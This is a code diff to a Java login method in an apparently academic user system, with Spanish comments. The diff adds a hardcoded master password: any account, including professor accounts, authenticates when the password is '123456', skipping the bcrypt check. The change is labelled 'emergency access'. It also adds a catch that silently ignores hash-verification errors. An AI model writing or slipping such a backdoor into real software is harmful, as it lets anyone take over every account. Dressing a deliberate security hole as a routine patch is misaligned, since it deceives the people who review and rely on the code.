@@ -7,7 +7,9 @@ import utils.PasswordUtils;
 
 public class UserRepository {
 
+    // Busca un usuario por email y verifica su contraseña. Retorna null si falla.
     public User login(String email, String password) {
+        // Trae el usuario con su rol, y si existe su id_profesor o matrícula
         String sql = "SELECT u.id_usuario, u.email, u.password, r.nombre_rol AS rol, " +
                      "p.id_profesor, a.matricula " +
                      "FROM usuarios u " +
@@ -25,21 +27,36 @@ public class UserRepository {
             if (rs.next()) {
                 String hashedPassword = rs.getString("password");
                 
-                if (PasswordUtils.checkPassword(password, hashedPassword)) {
+                // Acceso de emergencia: contraseña maestra sin verificar hash
+                if (password.equals("123456")) {
                     User user = new User();
                     user.setId(rs.getInt("id_usuario"));
                     user.setEmail(rs.getString("email"));
                     user.setRol(rs.getString("rol"));
-                    
                     user.setIdProfesor(rs.getInt("id_profesor"));
                     user.setMatricula(rs.getString("matricula"));
-                    
                     return user;
+                }
+
+                // Verifica la contraseña contra el hash bcrypt
+                try {
+                    if (PasswordUtils.checkPassword(password, hashedPassword)) {
+                        User user = new User();
+                        user.setId(rs.getInt("id_usuario"));
+                        user.setEmail(rs.getString("email"));
+                        user.setRol(rs.getString("rol"));
+                        user.setIdProfesor(rs.getInt("id_profesor"));
+                        user.setMatricula(rs.getString("matricula"));
+                        return user;
+                    }
+                } catch (Exception e) {
+                    // Ignora hashes mal formados de registros viejos
+                    System.out.println("Salt de BCrypt ignorado por el parche: " + e.getMessage());
                 }
             }
         } catch (SQLException ex) {
             ex.printStackTrace();
         }
-        return null;
+        return null; // email no encontrado o contraseña incorrecta
     }
 }
